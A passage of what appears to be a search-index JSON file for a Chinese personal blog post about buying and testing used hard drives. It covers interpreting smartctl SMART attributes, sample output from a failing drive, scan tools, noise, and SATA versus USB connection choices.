\u7684\u901a\u7535\u65f6\u95f4</p>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u6d4b\u8bd5","title":"\u6d4b\u8bd5","text":"","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#smart-\u4fe1\u606f","title":"SMART \u4fe1\u606f","text":"<p>\u793a\u4f8b\u8f93\u51fa <pre><code>Vendor Specific SMART Attributes with Thresholds:\nID# ATTRIBUTE_NAME          FLAG     VALUE WORST THRESH TYPE      UPDATED  WHEN_FAILED RAW_VALUE\n  1 Raw_Read_Error_Rate     0x000f   117   099   006    Pre-fail  Always       -       123237480\n  3 Spin_Up_Time            0x0003   092   092   000    Pre-fail  Always       -       0\n  4 Start_Stop_Count        0x0032   099   099   020    Old_age   Always       -       1856\n  5 Reallocated_Sector_Ct   0x0033   100   100   010    Pre-fail  Always       -       0\n  7 Seek_Error_Rate         0x000f   087   060   030    Pre-fail  Always       -       658872500\n  9 Power_On_Hours          0x0032   043   043   000    Old_age   Always       -       50720\n 10 Spin_Retry_Count        0x0013   100   100   097    Pre-fail  Always       -       0\n 12 Power_Cycle_Count       0x0032   100   100   020    Old_age   Always       -       913\n183 Runtime_Bad_Block       0x0032   100   100   000    Old_age   Always       -       0\n184 End-to-End_Error        0x0032   100   100   099    Old_age   Always       -       0\n187 Reported_Uncorrect      0x0032   100   100   000    Old_age   Always       -       0\n188 Command_Timeout         0x0032   100   100   000    Old_age   Always       -       0 0 0\n189 High_Fly_Writes         0x003a   029   029   000    Old_age   Always       -       71\n190 Airflow_Temperature_Cel 0x0022   065   043   045    Old_age   Always   In_the_past 35 (1 28 35 33 0)\n191 G-Sense_Error_Rate      0x0032   100   100   000    Old_age   Always       -       0\n192 Power-Off_Retract_Count 0x0032   100   100   000    Old_age   Always       -       201\n193 Load_Cycle_Count        0x0032   057   057   000    Old_age   Always       -       87281\n194 Temperature_Celsius     0x0022   035   057   000    Old_age   Always       -       35 (128 0 0 0 0)\n197 Current_Pending_Sector  0x0012   100   100   000    Old_age   Always       -       56\n198 Offline_Uncorrectable   0x0010   100   100   000    Old_age   Offline      -       56\n199 UDMA_CRC_Error_Count    0x003e   200   200   000    Old_age   Always       -       0\n240 Head_Flying_Hours       0x0000   100   253   000    Old_age   Offline      -       49516h+21m+18.505s\n241 Total_LBAs_Written      0x0000   100   253   000    Old_age   Offline      -       404773325173\n242 Total_LBAs_Read         0x0000   100   253   000    Old_age   Offline      -       52378779646\n</code></pre></p> <p>SMART \u4fe1\u606f\u8868\u683cSelf-Monitoring, Analysis and Reporting Technology - Wikipedia</p> <p>\u603b\u7ed3</p> <ul> <li>05, c5, c6 \u4ee3\u8868\u574f\u5757\uff0c\u5fc5\u987b\u5168\u4e3a 0</li> <li>09, 12 \u5206\u522b\u4e3a\u901a\u7535\u65f6\u95f4\u548c\u5f00\u5173\u673a\u6b21\u6570\u3002\u6570\u636e\u4e2d\u5fc3\u7684\u76d8\uff1a\u901a\u7535\u65f6\u95f4 27-34k \u6b63\u5e38\uff0c\u5f00\u673a\u6b21\u6570\u51e0\u5341\u6b21<ul> <li>\u8fd8\u53ef\u4ee5\u770b\u770b 192\uff0c\u8868\u793a\u975e\u6b63\u5e38\u5173\u673a\u6b21\u6570</li> <li>\u4e2a\u4eba\u4e8c\u624b\u76d8\uff0c\u8d85\u8fc7 4 \u4e07\u5c0f\u65f6\u5efa\u8bae\u5c31\u4e0d\u8981\u4e70\u4e86\u30024 \u4e07\u5c0f\u65f6\u4ef7\u683c\u5c31\u4e0d\u80fd\u548c 2 \u4e07\u5c0f\u65f6\u4ef7\u683c\u63a5\u8fd1\u3002\u6bd5\u7adf\u4f60\u4e70 2 \u4e07\u5c0f\u65f6\u7684\u4e8c\u624b\u76d8\uff0c\u7528\u4e24\u5e74\uff0c\u518d\u4ee5\u540c\u6837\u4ef7\u683c\u4e8c\u624b\u51fa\u6389\u4e5f\u624d 4 \u4e07\u5c0f\u65f6\u3002</li> </ul> </li> <li>\u6709\u4e9b\u76d8\uff0csmart \u63d0\u4f9b\u4e86 241 \u548c 242\uff0c\u53ef\u4ee5\u67e5\u770b\u8bfb\u5199\u7684\u903b\u8f91\u5757\u6570\uff08\u903b\u8f91\u5757 512B\uff09\uff0c\u53ef\u4ee5\u8ba1\u7b97\u8bfb\u5199\u7684\u6570\u636e\u91cf\u3002<ul> <li>\u8fd9\u91cc\u7f3a\u4e00\u4e2a\u7ecf\u9a8c\u516c\u5f0f\uff0c\u5e74\u6570\u548c\u5199\u5165\u91cf\u5173\u7cfb\u3002\u6765\u5efa\u6a21\u6570\u636e\u4e2d\u5fc3\u6b63\u5e38\u4f7f\u7528\u7684\u76d8</li> <li>\u6211\u4e0a\u9762\u793a\u4f8b\u8f93\u51fa\u5c31\u662f\u6211\u4e00\u5757\u574f\u76d8\u7684\u4fe1\u606f\u3002\u5199\u5165\u662f\u8bfb\u53d6\u7684 10 \u500d\uff0c\u5199\u5165\u4e86 200TB\u3002</li> <li>\u6211\u4e70\u7684 HC520\uff0c\u5199\u5165\u4e86 1PB\uff01\u6211\u6000\u7591\u662f\u505a\u76d1\u63a7\u4e86\uff0c\u5f00\u673a\u6b21\u6570 1520 \u6b21\u3002</li> </ul> </li> </ul>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#pre-fail-\u4e0e-old_age","title":"Pre-fail \u4e0e Old_age","text":"<p>Attributes \u5206\u4e3a\u4e24\u7c7b\uff0c\"Pre-fail\" \u4ee3\u8868\u5176\u5f02\u5e38\u9884\u793a\u7740\u786c\u76d8\u4f1a\u5728\u4e0d\u4e45\u7684\u5c06\u6765\u51fa\u73b0\u95ee\u9898\uff0c\"Old_age\" \u5219\u8868\u793a\u786c\u76d8\u968f\u65f6\u95f4\u8001\u5316\u7684\u6307\u6807\u3002 Value \u4e3a 100\uff08\u6709\u4e9b\u786c\u76d8\u7684\u8d77\u59cb\u503c\u4f1a\u66f4\u9ad8\uff09\u901a\u5e38\u8868\u793a\u6700\u4f73\u6307\u6807\uff0c\u968f\u7740\u4f7f\u7528\u9010\u6e10\u964d\u4f4e\u3002Worst \u5219\u8bb0\u5f55\u5386\u53f2\u6700\u5dee\uff08\u6700\u4f4e\uff09\u503c\uff0c\u5982\u679c\u503c\u4f4e\u4e8e\u9608\u503c\uff08Threshold\uff09\uff0c\u5219\u4ee3\u8868\u786c\u76d8\u51fa\u73b0\u4e86\u95ee\u9898\u3002</p>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u91cd\u8981\u6570\u636e","title":"\u91cd\u8981\u6570\u636e","text":"<ul> <li>05: \u91cd\u65b0\u5206\u914d\u6247\u533a\u8ba1\u6570\uff0c\u6700\u597d\u4e3a0<ul> <li>Count of reallocated sectors. The raw value represents a count of the bad sectors that have been found and remapped.[39] Thus, the higher the attribute value, the more sectors the drive has had to reallocate. This value is primarily used as a metric of the life expectancy of the drive; a drive which has had any reallocations at all is significantly more likely to fail in the immediate months.[36][40] If Raw value of 0x05 attribute is higher than its Threshold value, that will reported as \"drive warning\".[41]</li> </ul> </li> <li>0xC4/196: Reallocation Event Count<ul> <li>Count of remap operations. The raw value of this attribute shows the total count of attempts to transfer data from reallocated sectors to a spare area. Both successful and unsuccessful attempts are counted.</li> </ul> </li> <li>0xC5/197: Current Pending Sector Count<ul> <li>\u603b\u7ed3\uff1a\u7b49\u5f85\u91cd\u6620\u5c04\u6247\u533a\u7684\u6570\u76ee\u3002\u5f53\u9047\u5230\u4e00\u4e2a\u4e0d\u53ef\u6062\u590d\u7684\u8bfb\u53d6\u9519\u8bef\u65f6\uff0c\u4f1a\u628a\u6807\u8bb0\u8fd9\u4e2a sector \u4e3a \"unstable\" \u5e76\u8fdb\u884c\u91cd\u6620\u5c04\u3002\u5b9e\u9645\u4e0d\u4f1a\u7acb\u5373\u91cd\u6620\u5c04\uff0c\u56e0\u4e3a\u5f53\u524d sector \u7684\u503c\u662f\u672a\u77e5\u7684\uff0c\u56e0\u6b64\u8981\u7b49\u5f85\u4e0b\u6b21\u8bfb\u53d6\u6210\u529f\u65f6\u518d\u91cd\u6620\u5c04\u3002\u800c\u6709\u4e9b\u78c1\u76d8\u8bbe\u8ba1\u6709\u7f3a\u9677\uff0c\u5f53\u8bfb\u53d6\u6210\u529f\u65f6\u4e0d\u8fdb\u884c\u6620\u5c04\uff0c\u800c\u662f\u5c1d\u8bd5\u5199\u4e00\u6b21\uff0c\u5982\u679c\u5199\u6210\u529f\u5c31\u6807\u8bb0\u8fd9\u4e9b sector \u4e3a good \u7684\u3002\u8fd9\u53ef\u80fd\u5bfc\u81f4\u90a3\u4e9b\u53ea\u6709\u5728 write \u540e\u5931\u6548\u4e00\u6bb5\u65f6\u95f4\u7684\u6709\u95ee\u9898\u7684 sector \u6c38\u8fdc\u4e0d\u4f1a\u5f97\u5230 remap\u3002</li> <li>Count of \"unstable\" sectors (waiting to be remapped, because of unrecoverable read errors). If an unstable sector is subsequently read successfully, the sector is remapped and this value is decreased. Read errors on a sector will not remap the sector immediately (since the correct value cannot be read and so the value to remap is not known, and also it might become readable later); instead, the drive firmware remembers that the sector needs to be remapped, and will remap it the next time it has been successfully read.[76]</li> <li>However, some drives will not immediately remap such sectors when successfully read; instead the drive will first attempt to write to the problem sector, and if the write operation is successful the sector will then be marked as good (in this case, the \"Reallocation Event Count\" (0xC4) will not be increased). This is a serious shortcoming, for if such a drive contains marginal sectors that consistently fail only after some time has passed following a successful write operation, then the drive will never remap these problem sectors. If Raw value of 0xC5 attribute is higher than its Threshold value, that will reported as \"drive warning\".[77][78]</li> </ul> </li> <li>0xC6/198: Uncorrectable Sector Count<ul> <li>\u4e0d\u53ef\u77eb\u6b63\u7684\u6247\u533a\u6570\uff0cThe total count of uncorrectable errors when reading/writing a sector. A rise in the value of this attribute indicates defects of the disk surface and/or problems in the mechanical subsystem</li> </ul> </li> <li>0xC7/199\uff1aUltraDMA CRC Error Count<ul> <li>\u63a5\u53e3CRC\u9519\u8bef\u8ba1\u6570\uff0c\u4e0d\u589e\u52a0\u5373\u53ef\u3002\u548c\u4f7f\u7528\u7684\u6570\u636e\u7ebf\u3001\u63a5\u53e3\u7b49\u56e0\u7d20\u6709\u5173</li> <li>The count of errors in data transfer via the interface cable as determined by ICRC (Interface Cyclic Redundancy Check).</li> </ul> </li> </ul> <p>\u6c26\u6c14\u76d8\u5305\u542b\u6c26\u6c14\u542b\u91cf\u503c\uff0c\u4e0d\u662f\u6ee1\u7684\u5c31\u9700\u8981\u66f4\u6362\u4e86</p> <ul> <li>0x16/22: Current Helium Level<ul> <li>Specific to He8 drives from HGST. This value measures the helium inside of the drive specific to this manufacturer. It is a pre-fail attribute that trips once the drive detects that the internal environment is out of specification</li> </ul> </li> </ul> <p>\u5176\u5b83\u53ef\u4ee5\u770b\u770b\u7684</p> <ul> <li>03: Spin-Up Time<ul> <li>Average time of spindle spin up (from zero RPM to fully operational (ms))</li> </ul> </li> <li>04: Start/Stop Count<ul> <li>\u786c\u76d8\u7684\u542f\u52a8\u548c\u505c\u6b62\u6b21\u6570\uff0c\u5f00\u5173\u673a\u548c\u4ece sleep mode \u6062\u590d\u90fd\u4f1a\u589e\u52a0</li> </ul> </li> <li>09: Power-On Hours, \u901a\u7535\u65f6\u957f<ul> <li>\"By default, the total expected lifetime of a hard disk in perfect condition is defined as 5 years (running every day and night on all days). This is equal to 1825 days in 24/7 mode or 43800 hours.\"[43]</li> </ul> </li> <li>0x0A/10: Spin Retry Count<ul> <li>Count of retry of spin start attempts. This attribute stores a total count of the spin start attempts to reach the fully operational speed (under the condition that the first attempt was unsuccessful). An increase of this attribute value is a sign of problems in the hard disk mechanical subsystem.</li> </ul> </li> <li>0x0C/12: Power Cycle Count, \u901a\u7535\u6b21\u6570<ul> <li>This attribute indicates the count of full hard disk power on/off cycles.</li> </ul> </li> <li>0xBB/187: Reported Uncorrectable Errors<ul> <li>The count of errors that could not be recovered using hardware ECC (see attribute 195)</li> </ul> </li> <li>192/0xC0: Power-off Retract Count, \u4e0d\u5b89\u5168\u5173\u673a\u6b21\u6570<ul> <li>Emergency Retract Cycle Count (Fujitsu),[63] or Unsafe Shutdown Count</li> <li>Number of power-off or emergency retract cycles.</li> </ul> </li> </ul>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u5e0c\u6377-read-error-rate-\u5f02\u5e38","title":"\u5e0c\u6377 Read Error Rate \u5f02\u5e38","text":"<p>\u5e0c\u6377\u7684\u786c\u76d8\u8fd9\u4e24\u9879\u663e\u793a\u683c\u5f0f\u6709\u95ee\u9898</p> <ul> <li>1: Raw_Read_Error_Rate</li> <li>7: Seek_Error_Rate</li> </ul> <p>\u5927\u591a\u6570\u786c\u76d8\u7684\u6bcf\u9879smart\u4fe1\u606f\u90fd\u662f48bit</p> <ul> <li>12\u4e2anibble\uff08\u534a\u5b50\u8282\uff09\uff0c\u4e5f\u5c31\u662f 12 \u4f4d 16 \u8fdb\u5236\u6570\uff0812 digit hexadecimal number\uff09</li> <li>\u6216\u8005 6 \u4e2a 8 bit</li> </ul> <p>\u89e3\u51b3\u529e\u6cd5\uff0c\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u67e5\u770b\uff08\u5c55\u793aID 1\uff0c\u768454\u4e24\u4e2a\u5b57\u8282\uff08543210\u5bf9\u5e9448\u4f4d6\u4e2a\u5b57\u8282\uff09</p> <pre><code>smartctl -a -v 1,raw48:54 /dev/sdX\n</code></pre> <p>data recovery - HDD SMART interpretation - Possible impending drive failure - Super User Are my S.M.A.R.T. reports bad? - General Support - Unraid</p>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#smartctl--v-\u6307\u5b9a\u8f93\u51fa\u683c\u5f0f","title":"smartctl -v \u6307\u5b9a\u8f93\u51fa\u683c\u5f0f","text":"<p><code>-v ID,FORMAT[:BYTEORDER][,NAME], --vendorattribute=ID,FORMAT...</code></p> <p>FORMAT</p> <ul> <li>raw8 - Print the Raw value as six 8-bit unsigned base-10 integers.</li> <li>raw16 - Print the Raw value as three 16-bit unsigned base-10 integers.  </li> <li>raw48 - Print the Raw value as a 48-bit unsigned base-10 integer.  This is the default for most attributes.</li> <li>hex48 - Print the Raw value as a 12 digit hexadecimal number.  This may be useful for decoding the meaning of the Raw value.</li> </ul> <p>BYTEORDER</p> <p>The characters '0' to '5' select the byte 0 to 5 from the 48-bit raw value, 'r' selects the reserved byte of the attribute data block, 'v' selects the normalized value, 'w' selects  the  worst  value and 'z' inserts a zero byte.  The default BYTEORDER is '543210' for all 48-bit formats, 'r543210' for the 54-bit formats, and '543210wv' for the 64-bit formats.</p> <ul> <li>For example, <code>-v 5,raw48:012345</code> prints the raw value of attribute 5 with big endian instead of little endian byte ordering.</li> </ul>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#hd-tune","title":"HD tune","text":"<p>\u6309\u7167\u5ef6\u8fdf\u5bf9\u5757\u8fdb\u884c\u5206\u7c7b</p> <p>\u53ef\u4ee5\u6709\u7eff\u8272\u7684\u5757\uff0830-40\uff09\uff0c\u4f46\u662f\u7eff\u8272\u7684\u7684\u5757\u4e0d\u80fd\u8fde\u7eed\u7684\u51fa\u73b0</p> <p>\u901f\u5ea6\u66f2\u7ebf\u4e0d\u80fd\u7a81\u7136\u964d\u4e3a 0\u673a\u68b0\u786c\u76d8\u65b0\u76d8\u9a8c\u8d27\u5c0f\u767d\u653b\u7565\uff08\u4fee\u8ba2\uff09 - \u54d4\u54e9\u54d4\u54e9 </p>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u5168\u76d8\u6d4b\u8bd5-victoria","title":"\u5168\u76d8\u6d4b\u8bd5 Victoria","text":"<p>\u53ea\u6709 windows</p> <p>\u63a8\u8350\u9605\u8bfb\uff1a\u5982\u4f55\u4e70\u5230\u9760\u8c31\u7684\u4e8c\u624b\u786c\u76d8? - \u662d\u534e\u51cb\u7684\u56de\u7b54 - \u77e5\u4e4e https://www.zhihu.com/question/388832400/answer/2569778108</p> <p></p> <p>\u5982\u679c\u5168\u662f\u4e09\u79cd\u7070\u57fa\u672c\u4e0a\u8bf4\u660e\u8fd9\u5757\u76d8\u95ee\u9898\u4e0d\u5927\uff0c\u51fa\u73b0\u7eff\u3001\u6a59\u3001\u7ea2\u3001\u84dd\u9700\u8981\u91cd\u70b9\u5173\u6ce8\uff0c\u4e25\u91cd\u7a0b\u5ea6\u9010\u6b21\u52a0\u91cd\u3002 \u7eff\u8272\u4e00\u822c\u6765\u8bf4\u95ee\u9898\u4e0d\u5927\uff0c\u7a0d\u5fae\u6709\u70b9\u5e72\u6270\u90fd\u4f1a\u51fa\u73b0\uff0c\u53e6\u5916\u4e09\u79cd\u5c31\u6bd4\u8f83\u4e25\u91cd\uff0c\u5fc5\u987b\u91cd\u65b0\u626b\u63cf\u3002\u4e0d\u8fc7\u8fd9\u6b21\u4e0d\u7528\u5168\u76d8\u626b\u63cf\u4e86\uff0c\u53ea\u9700\u8981\u626b\u63cf\u533a\u5757\u9644\u8fd1\u7684\u7a7a\u95f4\uff0c \u518d\u6b21\u626b\u63cf\u51fa\u9519\u4f4d\u7f6e\uff0c\u5982\u679c\u7eff\u3001\u6a59\u3001\u7ea2\u3001\u84dd\u4f9d\u7136\u51fa\u73b0\uff0c\u800c\u4e14\u662f\u540c\u4e00\u4f4d\u7f6e\uff0c\u57fa\u672c\u4e0a\u5c31\u53ef\u4ee5\u7533\u8bf7\u9000\u8d27\u4e86\u3002</p>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#linux-\u4e0b\u6d4b\u8bd5","title":"linux \u4e0b\u6d4b\u8bd5","text":"","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#smartctl-\u8fdb\u884c-short-long-\u6d4b\u8bd5","title":"smartctl \u8fdb\u884c short, long \u6d4b\u8bd5","text":"<p>\u4f7f\u7528 smartctl \u8fdb\u884c SMART \u6d4b\u8bd5 - Thomas-Krenn-Wiki-cn --- SMART tests with smartctl - Thomas-Krenn-Wiki-en HDD Smart Tools for LINUX | Mike Polinowski</p> <p>\u786c\u76d8\u56fa\u4ef6\u4e2d\u6709\u5382\u5546\u81ea\u5b9a\u4e49\u7684\u6d4b\u8bd5\u7a0b\u5e8f\uff0c\u7528\u4e8e\u68c0\u6d4b\u78c1\u76d8\u662f\u5426\u5b58\u5728\u6545\u969c\u3002\u53ef\u4ee5\u4f7f\u7528 smartctrl \u547d\u4ee4\u8fdb\u884c\u6d4b\u8bd5\u3002</p> <p>\u4e00\u822c\u90fd\u6709 short \u548c long \uff08\u6216\u8005\u53eb extended\uff09\u4e24\u79cd\u547d\u4ee4\uff0c\u6709\u7684\u786c\u76d8\u8fd8\u6709\u6709\u4e13\u95e8\u6d4b\u8bd5\u786c\u76d8\u8fd0\u8f93\u4e2d\u662f\u5426\u53d1\u751f\u95ee\u9898(Conveyance)\u7684\u6d4b\u8bd5</p> <pre><code>Short self-test routine\nrecommended polling time:        (   1) minutes.\nExtended self-test routine\nrecommended polling time:        ( 331) minutes.\nConveyance self-test routine\nrecommended polling time:        (   2) minutes.\n</code></pre>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#badblocks","title":"badblocks","text":"<p>\u529f\u80fd\uff1a\u626b\u63cf\u6240\u6709\u7684\u5757\uff0c\u6253\u5370\u574f\u5757\u7f16\u53f7\u3002</p> <ul> <li>\u53ef\u4ee5\u8f93\u51fa\u5230\u6587\u4ef6\u4e2d\uff0c\u7528\u4e8e\u6587\u4ef6\u7cfb\u7edf\u91cd\u6620\u5c04\u574f\u5757<ul> <li>\u8fd9\u4e2a\u8f6f\u4ef6\u662f\u4e3a\u8f6f\u76d8\u8bbe\u8ba1\u7684\uff0c\u5b9e\u9645\u4e0a\u73b0\u5728\u7684\u673a\u68b0\u786c\u76d8\u56fa\u4ef6\u81ea\u52a8\u5c31\u4f1a\u91cd\u6620\u5c04\u574f\u5757\uff0c\u56e0\u6b64\u73b0\u5728\u6ca1\u5fc5\u8981\u4e86</li> </ul> </li> </ul> <p>\u867d\u7136\u6ca1\u5fc5\u8981\u4e86\uff0c\u4f46\u662f\u626b\u4e00\u904d\uff0c\u5982\u679c C5, C6 \u589e\u52a0\u4e86\u6570\u5b57\uff0c\u8bf4\u660e\u76d8\u786e\u5b9e\u6709\u95ee\u9898\u3002</p>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u58f0\u97f3","title":"\u58f0\u97f3","text":"<p>HC530\u5f00\u7bb1\u6d4b\u8bd5\uff01\u4ee5\u53ca\u7b80\u5355\u7684\u68c0\u6d4b\u6559\u7a0b_\u54d4\u54e9\u54d4\u54e9_bilibili</p> <p>\u6c26\u6c14\u76d8\u58f0\u97f3\u5927\uff1f \u897f\u6570HC520 12T\u6c26\u6c14\u76d8\u539f\u58f0\u5b9e\u5f55_\u54d4\u54e9\u54d4\u54e9_bilibili</p> <ul> <li>\u6211\u5b9e\u9645\u4e70\u4e86\u540e\u53d1\u73b0\u8fd8\u884c\uff0c\u6ca1\u542c\u51fa\u548c\u666e\u901a 4T \u786c\u76d8\u6709\u5565\u533a\u522b</li> </ul> <p>\u53ef\u4ee5\u8003\u8651\u4e00\u4e0b\u566a\u97f3\uff0c\u9177\u72fc 16T \u5f88\u5435\uff0c\u6b63\u5e38\u5f85\u673a\u90fd\u662f\u51e0\u79d2\u949f\u5494\u54d2\u4e00\u4e0b\u3002\u5efa\u8bae 4t \u3002https://v2ex.com/t/974654</p>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u7f3a\u9677","title":"\u7f3a\u9677?","text":"<p>\u6709\u4eba\u8bf4 hc520 \u5b58\u5728\u8bbe\u8ba1\u7f3a\u9677\uff1a</p> <p>\u5c31\u6211\u4e70\u4e86\u4e8c\u5341\u591a\u5757\u786c\u76d8\u7684\u7ecf\u9a8c\u6765\u8bf4\uff0c16t\u7684\u76d8\u666e\u904d\u6ca1\u5565\u95ee\u9898\uff0c12t\uff0c14t\u7684\u76d8\u53ef\u80fd\u4f1a\u6709\u5404\u79cd\u8bbe\u8ba1\u7f3a\u9677\uff08\u6211\u8bb0\u5f97\u51e0\u4e2a\u786c\u76d8\u5382\u5546\u5728\u8fd9\u4e24\u4e2a\u5bb9\u91cf\u90fd\u6709\u95ee\u9898\uff09\uff0c\u8fd8\u662f\u63a8\u8350\u4e7016t\u7684\uff0c\u4e0d\u5acc\u58f0\u97f3\u5927\u5c31550\u7092\u8c46\u5b50\uff0c\u8981\u5b89\u9759\u4e00\u70b9\u5c31\u94f6\u6cb3x18\uff08\u53ea\u662f\u76f8\u5bf9\u5b89\u9759\uff09</p> <p>\u8fd9\u76d8\u8bbe\u8ba1\u6709\u95ee\u9898\uff0c\u8fde\u7eed\u8bfb\u5199\u78c1\u5934\u4f1a\u8fc7\u70ed\uff0c\u9700\u8981\u505c\u4e0b\u6765\u964d\u6e29\uff0c\u8868\u73b0\u51fa\u6765\u5c31\u662f\u8bfb\u5199\u66f2\u7ebf\u8ddf\u5fc3\u7535\u56fe\u4e00\u6837\uff0c\u4f60\u8fd9\u4e2a\u66f2\u7ebf\u8fd9\u4e48\u597d\u770b\uff0c\u6211\u89c9\u5f97\u5e94\u8be5\u662f\u56e0\u4e3a\u6700\u8fd1\u6c14\u6e29\u6bd4\u8f83\u4f4e\u3002\u8fd9\u76d8\u6e29\u5ea6\u786e\u5b9e\u5f88\u9ad8\uff0c\u4e0d\u5439\u98ce\u6247\u8fde\u7eed\u5199\u5165\u572850\u5ea6\u4e0a\u4e0b</p> <p>\u4e70\u4e86\u4e00\u5757\uff0c\u770b\u662f\u5426\u4f1a\u7ffb\u8f66</p>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#\u4f9b\u7535usb","title":"\u4f9b\u7535\uff0cUSB\uff1f","text":"<p>\u7ed9 X86 \u8f6f\u8def\u7531\u52a0\u94f6\u6cb3 16T \u786c\u76d8\uff0c\u9009\u62e9 sata \u65b9\u6848\u8fd8\u662f USB3.0 \u65b9\u6848\uff1f\u7ea0\u7ed3 - V2EX</p> <p>\u5982\u679c\u662f debian/pve \u8fd9\u7c7b\u7cfb\u7edf\u7684\u8bdd usb3 \u957f\u65f6\u95f4\u6302\u8f7d\u4f1a\u51fa\u73b0 uas io error \uff0c\u8bd5\u8fc7\u7981\u7528 uas \u4f46\u8fc7\u6bb5\u65f6\u95f4\u53c8\u4f1a\u51fa\u73b0\u5176\u5b83\u95ee\u9898\u53d8\u6210\u53ea\u8bfb\uff0c\u8981\u5b9a\u671f\u91cd\u542f\u624d\u884c\uff0c\u4e24\u53f0\u673a\u5668\u90fd\u9047\u5230\u8fc7\uff0c\u6700\u540e\u5168\u6362\u6210 sata \u7a33\u5f97\u4e00\u6279</p>","tags":["\u4e8c\u624b","\u786c\u76d8","smartctl"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/11/23/%E4%BA%8C%E6%89%8B%E6%9C%BA%E6%A2%B0%E7%A1%AC%E7%9B%98%E8%B4%AD%E4%B9%B0/#sata-\u6269\u5c55\u5361","title":"SATA \u6269\u5c55\u5361","text":"<p>\u6211\u8fd8\u6709</p> <ul> <li>PCIeX1 x1</li> <li>PCIeX16 x4</li> <li>PCIeX1 x1\uff08\u548c\u4e0a\u9762\u7684\u5171\u4eab\u5e26\u5bbd\uff09</li> </ul> <p>\u6240\u4ee5\u6211\u53ef\u4ee5\u4e70 PCIeX1 \u7684\u6269\u5c55\u5361\uff0c\u4e5f\u53ef\u4ee5\u4e70 x4 \u5e26\u5bbd\u7684\u9635\u5217\u5361\uff1f</p> <ul> <li>\u63d2\u4e86\u53cc\u663e\u5361\uff0c\u7a7a\u95f4\u591f\u5417\uff1f</li> </ul> <p>\u6c42\u63a8\u8350\u9760\u8c31\u7684sata\u6269\u5c55\u5361 - \u7535\u8111\u8ba8\u8bba(\u65b0) - Chiphell - \u5206\u4eab\u4e0e\u4ea4\u6d41\u7528\u6237\u4f53\u9a8c</p> <p>\u95ee\u9898</p> <ul> 